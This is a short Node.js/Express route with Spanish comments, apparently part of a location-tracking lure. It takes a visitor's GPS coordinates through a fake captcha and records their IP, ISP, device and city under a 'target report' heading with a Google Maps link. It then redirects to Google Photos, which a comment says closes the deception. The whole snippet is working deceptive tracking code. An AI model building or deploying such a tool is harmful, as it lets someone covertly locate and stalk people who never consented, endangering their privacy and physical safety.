// ... (mismo inicio de tu código anterior)

app.get('/api/track', async (req, res) => {
    try {
        const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
        const { lat, lon, acc, gps } = req.query; // Capturamos los datos del Captcha
        const userAgent = req.headers['user-agent'];

        const geoResponse = await axios.get(`http://ip-api.com/json/${ip}`);
        const geo = geoResponse.data;

        console.log("--- REPORTE DE OBJETIVO ---");
        if (lat && lon) {
            console.log(`📍 UBICACIÓN GPS REAL: https://www.google.com/maps?q=${lat},${lon}`);
            console.log(`🎯 Precisión: ${acc} metros`);
        } else {
            console.log(`❌ GPS Denegado/No soportado. Razón: ${gps}`);
        }
        
        console.log(`🌐 IP: ${ip} (${geo.isp})`);
        console.log(`📱 Dispositivo: ${userAgent}`);
        console.log(`🏙️ Ciudad (IP): ${geo.city}, ${geo.country}`);
        console.log("---------------------------");

        res.redirect('https://photos.google.com'); // Redirigir a Google Fotos real para cerrar el engaño
    } catch (e) {
        res.redirect('https://photos.google.com');
    }
});